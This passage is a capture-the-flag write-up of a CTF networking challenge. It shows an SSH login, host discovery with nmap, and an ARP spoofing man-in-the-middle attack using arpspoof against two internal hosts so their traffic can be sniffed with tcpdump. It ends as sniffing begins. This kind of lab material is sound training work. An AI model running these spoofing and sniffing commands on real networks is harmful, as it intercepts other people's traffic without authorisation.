## Solution
This challenge has many parts. Let's start.
### The SSH Server
We start by connecting to the SSH server and searching around:
```console
root@kali:/media/sf_CTFs/checkpoint/CS-hAcked# sshpass -p 123123 ssh PI:EMAIL -p 2222
                 uuuuuuu
             uu$$$$$$$$$$$uu
          uu$$$$$$$$$$$$$$$$$uu
         u$$$$$$$$$$$$$$$$$$$$$u
        u$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$$$$$$$$$$$$$$$$$$$$u
       u$$$$$$"   "$$$"   "$$$$$$u
       "$$$$"      u$u       $$$$"
        $$$u       u$u       u$$$
        $$$u      u$$$u      u$$$
         "$$$$uu$$$   $$$uu$$$$"
          "$$$$$$$"   "$$$$$$$"
            u$$$$$$$u$$$$$$$u
             u$"$"$"$"$"$"$u
  uuu        $$u$ $ $ $ $u$$       uuu
 u$$$$        $$$$$u$u$u$$$       u$$$$
  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
 """      ""$$$$$$$$$$$uu ""$"""
           uuuu ""$$$$$$$$$$uuu
  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
  $$$$$$$$$$""""           ""$$$$$$$$$$$"
   "$$$$$"                      ""$$$$""
     $$$"                         $$$$"

Great! let's go quick get the sequence before getting detected
Goodluck!
```
This is a networking challenge, so let's take a look at network related properties, such as our IP addresses and MAC addresses. Commands such as `ifconfig` were blocked, but we can use:
```console
csa@9fdd7bdc3e3f:~$ hostname -I
172.29.0.2 172.16.238.3
csa@9fdd7bdc3e3f:~$ cat /sys/class/net/eth0/address
02:42:ac:1d:00:02
csa@9fdd7bdc3e3f:~$ cat /sys/class/net/eth1/address
02:42:ac:10:ee:03
```
We have two interfaces, let's scan for other IP addresses on our network like the hint told us to:
```console
csa@9fdd7bdc3e3f:~$ nmap -sP 172.16.238.3/24
Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-24 08:18 UTC
Nmap scan report for 172.16.238.1
Host is up (0.00039s latency).
Nmap scan report for ubuntu_server-in_1.ubuntu_local-net (172.16.238.2)
Host is up (0.00022s latency).
Nmap scan report for 9fdd7bdc3e3f (172.16.238.3)
Host is up (0.00018s latency).
Nmap scan report for ubuntu_client_1.ubuntu_local-net (172.16.238.4)
Host is up (0.00015s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.72 seconds
csa@9fdd7bdc3e3f:~$ nmap -sP 172.29.0.2/24
Starting Nmap 7.60 ( https://nmap.org ) at 2020-05-24 08:19 UTC
Nmap scan report for 9fdd7bdc3e3f (172.29.0.2)
Host is up (0.00012s latency).
Nmap done: 256 IP addresses (1 host up) scanned in 3.01 seconds
```
So on one of the subnets, we have two additional hosts:
* 172.16.238.2
* 172.16.238.4
Let's try to capture some network traffic on the interface:
```console
csa@9fdd7bdc3e3f:~$ tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
```
Not much is happening. This is where ARP Spoofing comes in.
(Note: When solving the challenge initially, there was actually lots of traffic on the network, which allowed skipping the following stage. In retrospective, this was due to other participants performing the ARP attack in parallel. Thanks to Idan for pointing this out!)
We need to cause the traffic between 172.16.238.2 and 172.16.238.4 to pass through our interface (172.16.238.3, 02:42:ac:10:ee:03) so that we can sniff it. We do that by opening two new SSH session and using `arpspoof`. 
In the first session we tell 172.16.238.2 that 172.16.238.4 is at our MAC address:
```console
csa@9fdd7bdc3e3f:~$ arpspoof -i eth1 -t 172.16.238.2 172.16.238.4
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:2 0806 42: arp reply 172.16.238.4 is-at 2:42:ac:10:ee:3
```
In the second session we tell 172.16.238.4 that 172.16.238.2 is at our MAC address:
```console
csa@9fdd7bdc3e3f:~$ arpspoof -i eth1 -t 172.16.238.4 172.16.238.2
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
2:42:ac:10:ee:3 2:42:ac:10:ee:4 0806 42: arp reply 172.16.238.2 is-at 2:42:ac:10:ee:3
```
Now we'll be able to sniff the traffic between the two hosts, as it will pass through our interface.
Now we can see lots of traffic:
```console
csa@9fdd7bdc3e3f:~$ tcpdump -i eth1
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes
